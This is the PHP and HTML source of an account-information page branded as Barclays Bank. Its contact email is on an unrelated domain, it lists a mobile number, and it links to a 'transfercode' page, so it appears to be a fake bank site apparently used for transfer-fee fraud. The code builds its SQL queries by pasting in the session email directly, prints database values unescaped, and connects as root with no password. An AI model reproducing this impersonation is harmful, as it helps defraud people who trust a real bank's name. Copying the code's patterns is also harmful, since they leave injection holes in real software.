<?php
session_start();
include 'connection.php';


$email=$_SESSION['email'];



    $sql = "SELECT * FROM frean WHERE email='$email'";
    $result = mysqli_query($conn, $sql);
    
         if (mysqli_num_rows($result) > 0) 
         {

             while($row = mysqli_fetch_assoc($result)) 
                {
					$amount = $row["final"];
					$current = $row["current"];
                }
          
        } 


mysqli_close($conn);
?>



<!DOCTYPE html>
<html lang="en">

<head>
    <title> Barclays Bank - Account Information</title>
    <link rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300&display=swap" rel="stylesheet">
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

</head>

<style>
table,
th,
td {
    border: 2px solid black;
}
</style>
<style>
label {
    display: inline-block;
    width: 400px;
    text-align: right;

}
</style>

<body>
    <section style="background:#FFffff;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4" style="margin:0;">
                    <div style="height:15px"></div>
                    <div style="height:55px;background-color:#000066;border:1px solid #000066;width:200px;">
                        <p style="text-align:center;padding-top:10px;"><img src="Image/barclays-log.png"
                                style="width:190px;height:30px;"></p>
                    </div>
                </div>
                <div class="col-md-4" style="margin:0;">

                </div>
                  <div class="col-md-4" style="margin:0;">
                    <div style="height:15px"></div>
                    <div style="background-color:#000099;width:270px;height:50px;border:1px solid #000099;">
                        <nav>
                            <a href="mailto:enquirydept@abaclrest.com"
                                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;padding-top:10px;text-indent:1em;"><i
                                    class='fa fa-comment'
                                    style='font-size:24px;padding-top:10px;color:#ffffff;'></i></a>
                            <a href="mailto:enquirydept@abaclrest.com"
                                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;padding-top:10px;text-indent:1em;"><i
                                    class='fa fa-cog' style='font-size:24px;padding-top:10px;color:#ffffff;'></i></a>
                            <a href="callto:+447810389895"
                                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;padding-top:10px;text-indent:1em;"><i
                                    class='fa fa-phone' style='font-size:24px;color:#ffffff;'></i></a>

                            <a href="secured-login.php" style="text-decoration:none;color:#ffffff;font-size:25px;"
                                style="font-family: 'Source Sans Pro', sans-serif;padding-top:10px;color:#ffffff;">
                                &nbsp &nbsp Log Out
                            </a>
                        </nav>
                    </div>
                </div>
            </div>
    </section>
    <div style="height:60px"></div>
    <div class="container">
        <div class="row">
            <div class="col-md-2">
            </div>
            <div class="col-md-8 ">
                <div id="Sign In" align="center">
                    &nbsp &nbsp &nbsp <iframe src="//www.exchangerates.org.uk/widget/ER-LRTICKER.php?w=490&s=1&mc=GBP&mbg=F0F0F0&bs=no&bc=000044&f=verdana&fs=10px&fc=000044&lc=000044&lhc=FE9A00&vc=FE9A00&vc
u=008000&vcd=FF0000&" width="600" height="30" frameborder="0" scrolling="no" marginwidth="0" marginheight="0"></iframe>
                </div>
            </div>
            <div class="col-md-2">
            </div>           
        </div>
    </div>
    <div style="height:60px"></div>
    <div id="Sign In" align="center">
        <table style="width:100%">
            <tr>
                <td
                    style="width:250px;background-color:#800000;border:1px solid #ffffff;color:#000099;text-align:center;font-size:25px;font-family: 'Source Sans Pro', sans-serif;">
                    <a href="account-holder.php" style="text-decoration:none;color:#ffffff;">OVERVIEW</a>
                </td>
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:30px;font-family: 'Source Sans Pro', sans-serif;font-size:23px;">
                    <a href="client-information.php" style="text-decoration:none;color:#ffffff;">ACCOUNT INFORMATION</a>
                </td>
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                    <a href="transfercode-balance.php" style="text-decoration:none;color:#ffffff;">TRANSFER</a>
                </td>
              
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                    <a href="#" style="text-decoration:none;color:#ffffff;">LOAN</a>
                </td>
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                    <a href="#" style="text-decoration:none;color:#ffffff;">FAQ</a>
                </td>

        </table>
    </div>

    <?php
$conn=new mysqli("localhost","root","","glen");
$SQL="select * from frean WHERE email='$email'";
$row=$conn->query($SQL);

if($row->num_rows>0)
{
	
	while($data=$row->fetch_assoc())
	{
		
		?>
    <div class="container" style="height:60px;width:1200px;background-color:#ffa31a;margin-top:20px;">
        <nav style="padding-top:10px;">
            <a href="client-information.php"
                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;text-indent:1em;text-decoration:none;color:#1f1f14;"><i
                    class='fa fa-money' style="font-size:15px;"></i>&nbsp Account Statement</a>
            <a href="/css/"
                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;text-indent:1em;text-decoration:none;color:#1f1f14;"><i
                    class='fa fa-shield' style='font-size:15px;'></i>&nbsp Change Pin</a>
            <a href="/python/"
                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;text-indent:1em;text-decoration:none;color:#1f1f14;"><i
                    class='fa fa-lock' style='font-size:15px'></i>&nbsp Change Password</a>
        </nav>
    </div>
    <div style="height:40px"></div>
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <table style="width:100%;background-color:#f5f5f0;border:1px solid #f5f5f0;">
                    <tr>
                        <td style="background-color:#f5f5f0;border:1px solid #c2c2a3;height:70px;">
                            <table>
                                <tr>
                                    <td
                                        style="width:30px;height:30px;background-color:#f5f5f0;border-top:2px solid #f5f5f0;border-bottom:2px solid #f5f5f0;border-left:2px solid #f5f5f0;border-right:2px solid #ff9900;">
                                    </td>
                                    <td
                                        style="width:330px;height:50px;border:2px solid #ff9900;background-color:#000000;font-size:25px;font-family: 'Source Sans Pro', sans-serif;text-align:center;color:#ffffff;">
                                        Customet Account Information</td>
                                </tr>

                            </table>
                        </td>
                    </tr>
                </table>
                <table style="width:100%;background-color:#f5f5f0;border:1px solid #f5f5f0;">
                    <tr>
                        <td style="background-color:#f5f5f0;border:1px solid #c2c2a3;width:100%;">
                            <div style="height:40px"></div>

                            <div class="block">
                                <label><b>Full Names</b> &nbsp </label>
                                <input type="text" id="fname" name="name" value="<?=$data ['name']?>"
                                    style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                            </div><br>
                            <div class="block">
                                <label><b>Mobile Number</b> &nbsp </label>
                                <input type="text" id="fname" name="phone" value="<?=$data ['phone']?>"
                                    style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                            </div><br>
                            <div class="block">
                                <label><b>Email</b> &nbsp </label>
                                <input type="text"  name="email" value="<?=$data ['email']?>"
                                    style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                            </div><br>
                            <div class="block">
                                <label><b>Address</b> &nbsp </label>
                                <input type="text" id="fname" name="address" value="<?=$data ['address']?>"
                                    style="width:600px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                            </div><br>
                            <div class="block">
                                <label><b>Swift Code</b> &nbsp </label>
                                <input type="text" id="fname" name="code" value="<?=$data ['code']?>"
                                    style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                            </div><br>
                            <div class="block">
                                <label><b>Pan Number</b> &nbsp </label>
                                <input type="text" id="fname" name="pan" value="<?=$data ['pan']?>"
                                    style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                            </div><br>
                            <div class="block">
                                <label><b>Bank Branch</b> &nbsp </label>
                                <input type="text" id="fname" name="fname" value="<?=$data ['branch']?>"
                                    style="width:600px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                            </div> <br>
                        </td>
                    </tr>
                </table>
            </div>
        </div>
    </div>
    <div style="height:40px"></div>
    <div id="Sign-In" align="center">
        <div
            style="width:1200px;height:60px;border:2px solid black; background-color:#800000;margin:auto;padding:10px;font-size:20px;color:#ffffff;font-family: 'Source Sans Pro', sans-serif;">
            © Copy Right Barclays Bank Plc. All Right Reserved.
        </div>
    </div>
    <?php
	
}
}
?>